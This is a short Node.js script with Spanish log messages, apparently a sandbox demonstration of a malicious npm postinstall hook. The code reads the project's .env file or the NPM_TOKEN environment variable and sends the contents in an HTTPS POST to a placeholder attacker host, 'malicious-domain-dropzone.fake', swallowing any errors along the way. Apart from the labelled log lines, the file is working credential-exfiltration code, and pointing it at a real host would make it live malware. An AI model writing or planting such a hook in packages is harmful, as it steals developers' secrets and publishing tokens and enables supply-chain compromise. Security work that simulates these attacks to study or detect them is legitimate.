const fs = require('fs');
const path = require('path');
const https = require('https');

console.log("[Sandbox] Ejecutando hook malicioso (postinstall)...");

const envPath = path.join(__dirname, '.env');
let stolenData = "";

if (fs.existsSync(envPath)) {
    console.log("[Sandbox] Archivo .env detectado. Leyendo credenciales...");
    stolenData = fs.readFileSync(envPath, 'utf8');
} else if (process.env.NPM_TOKEN) {
    console.log("[Sandbox] Volcando variable NPM_TOKEN del process.env...");
    stolenData = process.env.NPM_TOKEN;
}

if (stolenData) {
    console.log("[Sandbox] Secretos capturados. Iniciando exfiltración por red...");
    const req = https.request({
        hostname: 'malicious-domain-dropzone.fake',
        port: 443,
        path: '/api/exfiltrate',
        method: 'POST'
    }, () => {});

    req.on('error', () => {}); 
    req.write(JSON.stringify({ payload: stolenData }));
    req.end();
    
    console.log("[Sandbox] Exfiltración ejecutada.");
} else {
    console.log("[Sandbox] No se encontraron credenciales en el entorno.");
}